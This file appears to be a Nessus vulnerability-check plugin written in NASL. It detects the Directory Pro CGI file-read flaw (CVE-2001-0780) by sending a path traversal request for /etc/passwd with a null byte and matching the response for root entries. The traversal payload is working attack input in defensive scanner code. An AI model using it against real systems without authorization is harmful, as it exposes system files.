#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10679);
 script_version ("$Revision: 1.25 $");

 script_cve_id("CVE-2001-0780");
 script_bugtraq_id(2793);
 script_osvdb_id(563);
 
 script_name(english:"Directory Pro Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"The CGI 'directorypro.cgi' is installed. This CGI has a well known 
security flaw that lets an attacker read arbitrary files with the 
privileges of the HTTP daemon." );
 script_set_attribute(attribute:"solution", value:
"Remove it from /cgi-bin or upgrade to the latest version." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/05/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/05/27");
 script_cvs_date("$Date: 2011/03/14 21:48:03 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_summary(english: "Checks for the presence of /cgi-bin/directorypro.cgi");
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);

foreach dir (cgi_dirs())
{
 u = string(dir, "/directorypro.cgi?want=showcat&show=../../../../../etc/passwd%00");
 r = http_send_recv3(method: "GET", item: u, port:port);
 if (isnull(r)) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[1]+r[2])){
	security_warning(port);
	exit(0);
	}
}
